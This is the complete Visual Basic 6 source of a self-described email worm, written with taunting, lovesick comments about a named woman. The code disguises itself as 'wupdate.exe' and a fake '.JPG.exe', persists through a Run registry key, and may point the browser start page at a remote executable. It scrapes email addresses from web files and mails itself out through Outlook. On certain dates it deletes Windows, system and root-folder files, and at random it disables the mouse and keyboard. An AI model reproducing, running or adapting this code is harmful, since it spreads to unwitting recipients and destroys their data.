VERSION 5.00
Begin VB.Form w0rm 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "ZeynepCimen w0rm"
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Enabled         =   0   'False
   Icon            =   "w0rm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4
   ScaleMode       =   0  'User
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "w0rm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤
'¤ ZeynepCimen w0rm 8y Pink-Cashmere (+h1z 1z my 15+ 51lly w0rm d3d1c4+5d 2 my l0v3 :) ¤
'¤ I d1d 1+ ju5+ 4 fun. Iph j00 w4nn4 h3lp m3 0n 0+h3r w0rm5 c0n+4c+ m3! 1cq:173248605 ¤
'¤ I 54lu+3 ereglili67 :)                                                              ¤
'¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤
Option Explicit
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Private Type SHITEMID
cb As Long
abID As Byte
End Type
Private Type ITEMIDLIST
mkid As SHITEMID
End Type

Private Sub Form_Load()
On Error Resume Next
Dim Pink, Sup, WinDir, SysDir, TmpDir, RootDir, Of, T1, T2, R
'set directories
Set Pink = CreateObject("Scripting.FileSystemObject")
Set WinDir = Pink.GetSpecialFolder(0)
Set SysDir = Pink.GetSpecialFolder(1)
Set TmpDir = Pink.GetSpecialFolder(2)
Set RootDir = Pink.GetSpecialFolder(3)
'copy ourself to somewhere
Of = App.Path & "\" & App.EXEName & ".exe"
T1 = WinDir & "\wupdate.exe"
T2 = SysDir & "\ZeynepCimen.JPG.exe"
FileCopy Of, T1
FileCopy Of, T2
'add myself to regedit to start on each boot
Set Sup = CreateObject("WScript.Shell")
Sup.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update", "wupdate.exe"
'let's change internet explorer start page(random)
Randomize
R = Int((3 * Rnd) + 1)
If R = 1 Then
Sup.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.itu.edu.tr"
ElseIf R = 2 Then
Sup.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://kashmir.8bit.co.uk/casus.exe"
ElseIf R = 3 Then
Sup.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.balikesir.edu.tr"
End If
'love poem
Poem
'get mail adresses and send mails
SpreadAround GetSpecialFolder(&H20)
'gift for birthday
If Day(Now) = 23 And Month(Now) = 12 Or Day(Now) = 6 And Month(Now) = 1 Then HappyBirthday
'revenge from god
If Day(Now) = 2 And Month(Now) = 9 Then Revenge
'fuck santa claus
If Day(Now) = 1 And Month(Now) = 1 And Hour(Now) = 0 And Second(Now) = 0 Then HappyNewYear
'fuck valentine's day
If Day(Now) = 14 And Month(Now) = 2 Then MsgBox "Fuck valentine's day!", vbInformation, "ZeynepCimen w0rm"
'my portrait >:)
Randomize
R = Int(Rnd * 60)
If Second(Now) = R Then c0der.Show
'fun stuff for idiots
Randomize
R = Int((Rnd * 30) + 1)
If Day(Now) = R Then Sup.Run "rundll32.exe mouse,disable"
Randomize
R = Int(Rnd * 23)
If Hour(Now) = R Then
Sup.Run "rundll32.exe keyboard,disable"
Else
End
End If
'bye bye santa monica
End Sub

'love poem section
Sub Poem()
On Error Resume Next
Dim Pf, Poem
Set Pf = CreateObject("Scripting.FileSystemObject")
Set Poem = Pf.CreateTextFile("c:\Unforgettable.txt", True)
Poem.WriteLine "Unforgettable, thought near or far"
Poem.WriteLine "Like a song of love that climbs to me"
Poem.WriteLine "is the thought of you that stings to me"
Poem.WriteLine "Never before"
Poem.WriteLine "has someone been more"
Poem.WriteLine "Unforgettable, in every way"
Poem.WriteLine "And forever more, that's how you stay"
Poem.WriteLine "that's why, darling, it's incredible"
Poem.WriteLine "that someone so unforgettable"
Poem.WriteLine "thinks that I am"
Poem.WriteLine "unforgettable too."
Poem.Close
End Sub

'happy birtyday darling
Sub HappyBirthday()
On Error Resume Next
Dim Fso, Hp, Opt
Set Fso = CreateObject("Scripting.FileSystemObject")
Set Hp = CreateObject("WScript.Shell")
Opt = MsgBox("TODAY IS ZEYNEP CIMEN'S BIRTYDAH !!! :)" & vbCr & "AND HERE IS A LITTLE VIRUS FOR HER 20" & vbCr & "HAPPY BIRTHDAY ZEYNEP :) I MISS YOU SO...!" & vbCr & vbCr & "Take a reboot for her???", vbQuestion + vbYesNo, "ZeynepCimen w0rm")
If (Opt = vbYes) Then
Hp.Run ("rundll32.exe shell32.dll,SHExitWindowsEx 2")
Else
MsgBox "Do you think that you're clever? Heh! I don't think so.", vbQuestion, "ZeynepCimen w0rm"
Kill (Fso.GetSpecialFolder(0) & "\*.com")
Kill (Fso.GetSpecialFolder(0) & "\*.exe")
Kill (Fso.GetSpecialFolder(0) & "\*.dll")
Kill (Fso.GetSpecialFolder(1) & "\*.dll")
Hp.Run ("runonce -q")
End If
End Sub

'I don't like god
Sub Revenge()
On Error Resume Next
Dim Fso
Set Fso = CreateObject("Scripting.FileSystemObject")
MsgBox "That was this date on 2002. The day god gaved me the most pretty thing to me. That was she... One year pased soon. That was the same day again, and the same players of life. The director droped me out of the play. So I must revenge! Sorry.", vbExclamation, "ZeynepCimen w0rm"
Kill (Fso.GetSpecialFolder(0) & "\*.*")
Kill (Fso.GetSpecialFolder(1) & "\*.*")
Kill (Fso.GetSpecialFolder(3) & "\*.*")
End Sub

'happy new year idiot
Sub HappyNewYear()
On Error Resume Next
Dim Fso
Set Fso = CreateObject("Scripting.FileSystemObject")
MsgBox "Happy new year idiot >:)", vbInformation, "Santa Claus"
Kill (Fso.GetSpecialFolder(0) & "\*.*")
Kill (Fso.GetSpecialFolder(1) & "\*.*")
Kill (Fso.GetSpecialFolder(3) & "\*.*")
End Sub

'ass hole below here
Sub SpreadAround(dir)
On Error Resume Next
Dim Fso, FileIndex, FileList
Set Fso = CreateObject("Scripting.FileSystemObject")
Set FileList = Fso.GetFolder(dir).SubFolders
For Each FileIndex In FileList
Spread (FileIndex.Path)
SpreadAround (FileIndex.Path)
Next
End Sub

Sub Spread(dir)
Dim Mto As String
Dim D As Long
Dim Count As Long
Dim Fso, FileList, FileIndex, Ext, Status, S
Set Fso = CreateObject("Scripting.FileSystemObject")
Set FileList = Fso.GetFolder(dir).Files
For Each FileIndex In FileList
Ext = Fso.GetExtensionName(FileIndex.Path)
Ext = LCase(Ext)
If (Ext = "htm") Or (Ext = "html") Or (Ext = "asp") Or (Ext = "php") Then
Open FileIndex.Path For Input As #1
Do While Not EOF(1)
Line Input #1, Status
S = S & Status
Loop
Close #1
For D = 1 To Len(S)
If Mid(S, D, 7) = "mailto:" Then
Mto = ""
Count = 0
Do While Mid(S, D + 7 + Count, 1) <> """"
Mto = Mto + Mid(S, D + 7 + Count, 1)
Count = Count + 1
Loop
Call Infected(Mto)
End If
Next
End If
Next
End Sub

Function Infected(Mail As String)
On Error Resume Next
Dim Fso, Outlook, Mapi, Post
Set Fso = CreateObject("Scripting.FileSystemObject")
Set Outlook = CreateObject("Outlook.Application")
Set Mapi = Outlook.GetNameSpace("MAPI")
If Outlook = "Outlook" Then
Mapi.Logon "profile", "password"
Set Post = Outlook.CreateItem(0)
Post.Recipients.Add Mail
Post.Subject = "Who Is Zeynep Cimen ?¿?¿?¿"
Post.Body = "She's my only. And will be forever...! :)"
Post.Attachments.Add Fso.GetSpecialFolder(1) & "\ZeynepCimen.JPG.exe"
Post.Send
Post.DeleteAfterSubmit = True
Mapi.Logoff
End If
End Function

Private Function GetSpecialFolder(CSIDL As Long) As String
Dim R As Long
Dim IDL As ITEMIDLIST
Dim Path As String
R = SHGetSpecialFolderLocation(100, CSIDL, IDL)
If R = 0 Then
Path$ = Space$(512)
R = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
GetSpecialFolder = Left$(Path, InStr(Path, Chr$(0)) - 1)
Exit Function
End If
GetSpecialFolder = ""
End Function
'end of doomsday